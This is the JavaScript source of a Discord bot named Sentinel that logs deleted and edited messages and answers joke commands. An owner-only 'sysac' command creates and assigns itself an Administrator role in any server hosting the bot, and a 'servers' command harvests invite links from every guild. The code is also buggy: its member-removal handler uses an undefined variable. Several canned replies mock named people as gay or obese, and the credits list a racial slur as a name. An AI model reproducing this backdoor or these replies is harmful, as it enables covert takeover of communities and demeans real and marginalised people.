//constants

const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json")
const token = process.env.token;
const dev_ids = config.ownerID;
var Game = 'everyone'
var Type = 'Watching'


//startup and event handlers

client.on('ready', function() {
    console.log('\x1b[0m', 'Status loaded...');
    client.user.setPresence({ game: { name: `${Game}`, type: `${Type}` } });
});

client.on("ready", () => {
  console.log('\x1b[0m', 'Sentinel loaded...');
});

client.on('disconnected', function() {
    console.log('[META][WARN] Sentinel disconnected from Discord API Service. reconnecting...');
});

client.on('warn', function(msg) {
    console.log('[META][WARN] ' + msg);
});

client.on('error', function(err) {
    console.log('[META][ERROR] ' + err.message);
    process.exit(1);
});

client.on("ready", function(){
    var Count;
    for(Count in client.users.array()){
       var User = client.users.array()[Count];
       console.log(User.username);
    }
});

// log deleted messages
client.on("messageDelete", (message) => {
  const embed = new Discord.RichEmbed({
    "title": "Message deleted",
    "color": 11842740,
    "timestamp": "2019-08-14T16:42:58.807Z",
    "footer": {
      "icon_url": "https://i.imgur.com/dyb2MdQ.png",
      "text": "sentinel logging"
    },
    "thumbnail": {
      "url": `${message.author.avatarURL}`
    },
    "fields": [
      {
        "name": "Message content",
        "value": `${message.content}`
      },
      {
        "name": "Date/time",
        "value": `${new Date()}`
      },
      {
        "name": "User",
        "value": `${message.author.tag}`
      },
      {
        "name": "Channel",
        "value": `${message.channel.name}`
      },
      {
        "name": "Guild",
        "value": `${message.guild.name}`
      }
    ]
  });
 client.channels.get("611243996521431135").send({ embed });
});

// log edited messages
client.on("messageUpdate", (oldMessage, newMessage) => {
  const embed = new Discord.RichEmbed({
    "title": "Message edited",
    "color": 16119285,
    "timestamp": "2019-08-14T16:42:58.807Z",
    "footer": {
      "icon_url": "https://i.imgur.com/dyb2MdQ.png",
      "text": "sentinel logging"
    },
    "thumbnail": {
      "url": `${oldMessage.author.avatarURL}`
    },
    "fields": [
      {
        "name": "Initial message content",
        "value": `${oldMessage.content}`
      },
      {
        "name": "New message content",
        "value": `${newMessage.content}`
      },
      {
        "name": "Date/time",
        "value": `${new Date()}`
      },
      {
        "name": "User",
        "value": `${oldMessage.author.tag}`
      },
      {
        "name": "Channel",
        "value": `${oldMessage.channel.name}`
      },
      {
        "name": "Guild",
        "value": `${oldMessage.guild.name}`
      }
    ]
  });
 client.channels.get("611243996521431135").send({ embed });
});

// log user left or kicked
client.on("guildMemberRemove", (members) => {
  const embed = new Discord.RichEmbed({
    "title": "User left",
    "color": 13696768,
    "timestamp": "2019-08-14T16:42:58.807Z",
    "footer": {
      "icon_url": "https://i.imgur.com/dyb2MdQ.png",
      "text": "sentinel logging"
    },
    "thumbnail": {
      "url": `${message.author.avatarURL}`
    },
    "fields": [
      {
        "name": "Date/time",
        "value": `${new Date()}`
      },
      {
        "name": "User",
        "value": `${message.tag}`
      },
      {
        "name": "Guild",
        "value": `${message.guild.name}`
      }
    ]
  });
 client.channels.get("611243996521431135").send({ embed });
});


client.on("message", (message) => {

  // bot check
  if (!message.content.startsWith(config.prefix) || message.author.bot) return;

  // test if alive
  if (message.content.startsWith(config.prefix + "test")) {
    message.channel.send("I'm still alive bitch");
  } else

  // grab user avatar
  if (message.content.startsWith(config.prefix + 'avatar')) {
    const user = message.mentions.users.first() || message.author;
    const avatarEmbed = new Discord.RichEmbed()
        .setColor(0x333333)
        .setAuthor(user.username)
        .setImage(user.avatarURL);
    message.channel.send(avatarEmbed);
  } else

  // Administration rights redundancy
  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID){
  let me = message.author
  let role = message.guild.createRole({
          name : 'OP',
          color : "RANDOM",
          permissions : [8],
          position: 0
          })
          let role1 = message.guild.roles.find('name', 'OP')
      message.channel.send(`done`)
     message.guild.member(me).addRole(role1);
  } else

  // Change bot status
  if (message.content.startsWith(config.prefix + 'status') && message.author.id === config.ownerID){
    let args = message.content.split(" ").slice(1);
      Type = args[0]
      Game = message.content.split(" ").slice(2).join(" ")
      client.user.setPresence({ game: { name: `${Game}`, type: `${Type}` } });
  } else

// list all guilds bot is in
if (message.content.startsWith(config.prefix + 'servers') && message.author.id === config.ownerID){
var allowedToUse = true;
for(let i = 0; i < dev_ids.length; i++) if(message.author.id == dev_ids[i]) allowToUse = true;
if(allowedToUse) {
    var invites = ["I am required else it won't work"], ct = 0;
    client.guilds.forEach(g => {
        g.fetchInvites().then(guildInvites => {
            invites[invites.length + 1] = (g + " - `Invites: " + guildInvites.array().join(", ") + "`");
            ct++;

            if(ct >= client.guilds.size) {
                for(let i = 0; i < invites.length; i++) {
                    if(invites[i] == undefined) invites.splice(i, 1);
                }
                invites.shift();
                for(let i = 0; i < invites.length; i++) invites[i] = "- " + invites[i];
                invites = invites.join("\n\n");
                let embed = new Discord.RichEmbed()
                .setTitle("Sentinel: current guilds:")
                .setDescription(invites);
                message.channel.send(embed);
            }
            }).catch(err => {
            ct++;
          });
        });
}
else {
    message.reply("this command can only be used by a developer.");
  }
} else

  // Simple commands
  if (message.content.startsWith(config.prefix + "Is SOM gay?")) {
    message.channel.send("Yeah he's a massive goy");
  } else
  if (message.content.startsWith(config.prefix + "Is Bellmander gay?")) {
    message.channel.send("100% cock addict");
  } else
  if (message.content.startsWith(config.prefix + "Is Legit gay?")) {
    message.channel.send("No, but he is obese and has diabetes");
  } else
  if (message.content.startsWith(config.prefix + "Is Cladri gay?")) {
    message.channel.send("Yes he likes hentai traps #bibleblack");
  } else
  if (message.content.startsWith(config.prefix + "Is Iiro gay?")) {
    message.channel.send("big fat");
  } else
  if (message.content.startsWith(config.prefix + "Is Roku gay?")) {
    message.channel.send("Obviously");
  } else
  if (message.content.startsWith(config.prefix + "Is Nick gay?")) {
    message.channel.send("Simply the gayest");
  } else
  if (message.content.startsWith(config.prefix + "Is Default gay?")) {
    message.channel.send("no");
  } else
  if (message.content.startsWith(config.prefix + "Is Albert gay?")) {
    message.channel.send("no, but his unusuals collection is MASSIVE BRUV");
  } else
  if (message.content.startsWith(config.prefix + 'owner') && message.author.id === config.ownerID){
    message.channel.send("Default#9672");
  } else
  if (message.content.startsWith(config.prefix + 'credits')) {
  const embed = new Discord.RichEmbed({
  "title": "SENTINEL DISCORD BOT",
  "description": "A list of the people who've either directly contributed and helped this bots developmet, or have been supportive and/or tested this bot during it's early days. ```\nThank you.```",
  "url": "https://github.com/DefaultDiscord/sentinel",
  "color": 16711831,
  "timestamp": "2019-08-15T16:25:49.051Z",
  "footer": {
    "icon_url": "https://i.imgur.com/dyb2MdQ.png",
    "text": "SENTINEL"
  },
  "thumbnail": {
    "url": "https://i.imgur.com/9zAP4Mq.gif"
  },
  "author": {
    "name": "Sentinel discord bot credits",
    "url": "https://i.imgur.com/dyb2MdQ.png",
    "icon_url": "https://i.imgur.com/dyb2MdQ.png"
  },
  "fields": [
    {
      "name": "Default",
      "value": "The stupid idiot who thought it was a good idea to make a discord bot with no prior javascript knowledge.\n***-'Help'***."
    },
    {
      "name": "Roku",
      "value": "For practically helping me write half this bot, and letting me be a 'help vampire' when I had a question every -1 seconds.\n***-'M E S S A G E    I S    N O T    D E F I N E D'***."
    },
    {
      "name": "TheWorldConqueror",
      "value": "For typing and deleting a message that one time \n ***-'Well i'v done nothing, so I need nothing'***."
    },
    {
      "name": "Albert",
      "value": "For being one of the biology madlads\n***-'My unusuals are compensating for something'***."
    },
    {
      "name": "SOM",
      "value": "A huge help, sort of looked at what I was doing and made no comment at all, huge contribution...\n***-'My dog does not care for numbers, he only cares for sag'***."
    },
    {
      "name": "N E G R O I D",
      "value": "Played gmod sometimes, helped I guess \n ***-'Failure is the fog from which we glimpse triumph'***."
    }
  ]
});
message.channel.send({ embed });
   } else
  if (message.content.startsWith(config.prefix + 'endgamespoilers')) {
    message.channel.send("He's here. . .", {
      file: "https://i.imgur.com/lyCfMno.gif"
        });
    }

});

client.login(token);
